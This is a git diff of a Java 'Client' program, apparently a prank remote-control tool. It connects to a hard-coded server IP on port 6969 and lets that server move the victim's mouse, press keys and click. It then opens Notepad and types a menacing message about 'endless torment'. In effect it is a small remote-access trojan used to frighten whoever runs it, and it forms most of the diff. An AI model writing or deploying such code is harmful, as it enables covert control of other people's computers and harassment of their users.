@@ -8,7 +8,9 @@ import java.awt.Toolkit;
 import java.awt.event.KeyEvent;
 import java.awt.AWTException;
 import java.awt.Dimension;
-import java.awt.Point;
+import java.awt.event.InputEvent;
+import java.net.Inet4Address;
+import java.net.InetAddress;
 
 /**
  * Property of CASpirations No touchy or else we sue. If this is on your
@@ -21,34 +23,34 @@ class Client {
 
         // create a robot which is going to move the mouse
         Robot robot = new Robot();
-        for(int i = 5; i > 0; i--) {
-            System.out.println(i);
-            robot.delay(1000);
-        }
 
+        InetAddress ip = (Inet4Address) InetAddress.getLocalHost();
+        System.out.println(ip.getHostAddress());
         // create socket at ipv4 with port 6969 ;)
-        Socket socket = new Socket("208.84.138.20", 6969);
+        Socket socket = new Socket("10.10.4.183", 6969);
+//        Socket socket = new Socket("localhost", 6969);
 
         
         
         // set up an inputstream to receive info from server
         ObjectInputStream input = new ObjectInputStream(socket.getInputStream());
-        
+        //
         try {
             while (true) {
                 // receive input from server and move mouse to point that the server sent
                 Adrian serverInfo = (Adrian) input.readObject();
                 System.out.println(serverInfo);
-                robot.mouseMove(serverInfo.getMouse().x, serverInfo.getMouse().y);
-
-                if(serverInfo.getKeyPressed() > 0 && serverInfo.getKeyPressed() < 1000) {
+                robot.mouseMove(serverInfo.mouseLocation.x, serverInfo.mouseLocation.y);
+                System.out.println("moved mouse");
+                if(serverInfo.keyPressed > 0 && serverInfo.keyPressed < 1000) {
 //                     tempKey = serverInfo.getKeyPressed();
-                    robot.keyPress(KeyEvent.getExtendedKeyCodeForChar(serverInfo.getKeyPressed()));
-//                     System.out.println("Pressed " + tempKey);
-                    robot.keyRelease(KeyEvent.getExtendedKeyCodeForChar(serverInfo.getKeyPressed()));
+                    robot.keyPress(KeyEvent.getExtendedKeyCodeForChar(serverInfo.keyPressed));
+                    System.out.println("Pressed Something");
+                    robot.keyRelease(KeyEvent.getExtendedKeyCodeForChar(serverInfo.keyPressed));
                 }
-                else if(serverInfo.getKeyPressed() == 1000 || serverInfo.getKeyPressed() == 1001 || serverInfo.getKeyPressed() == 1002) {
-                    switch(serverInfo.getKeyPressed() {
+                if(serverInfo.keyPressed >= 1000) {
+                    System.out.println("clicked something");
+                    switch(serverInfo.keyPressed) {
                         case 1000:
                             robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
                             robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
@@ -68,9 +70,9 @@ class Client {
 // //                         robot.keyRelease(tempKey);
 //                         // System.out.println("Released " + tempKey);
 //                     }
-//                     catch(Exception e) {
+//                     caatch(Exception e) {
 
-//                     }
+//                 nabil sux.    }
 // //                     tempKey = -1;
 //                 }
             }
@@ -78,11 +80,11 @@ class Client {
             System.out.println("Starting Process");
             ProcessBuilder process = new ProcessBuilder("notepad.exe");
             Process notepadOpen = process.start();
-
+                            
             robot.delay(1000);
-            type("You cannot escape your endless torment.");
+            type("You cannot escape your endless torment. You are left here to suffer for eternity.");
             robot.delay(1000);
-            startTheFrickening();
+//            startTheFrickening();
         }
     }
 
